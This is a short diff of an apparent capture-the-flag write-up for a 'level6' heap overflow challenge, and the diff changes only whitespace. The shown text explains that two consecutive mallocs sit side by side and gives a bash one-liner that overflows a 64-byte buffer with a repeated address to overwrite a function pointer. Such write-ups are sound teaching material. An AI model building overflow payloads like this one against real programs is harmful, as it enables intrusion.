@@ -1,4 +1,4 @@
-Here, we need to overwrite the value of `m` . To do so, we will again do a buffer overflow. What we know also, is that if you do 2 mallocs in a row, you will get two address that are side by side. So, we can easily overflow our buffer and write inside `ppcVar1`  like so :
+Here, we need to overwrite the value of `m` . To do so, we will again do a buffer overflow. What we know also, is that if you do 2 mallocs in a row, you will get two address that are side by side. So, we can easily overflow our buffer and write inside `ppcVar1` like so :
 
 ```bash
  ./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08" * 1000')
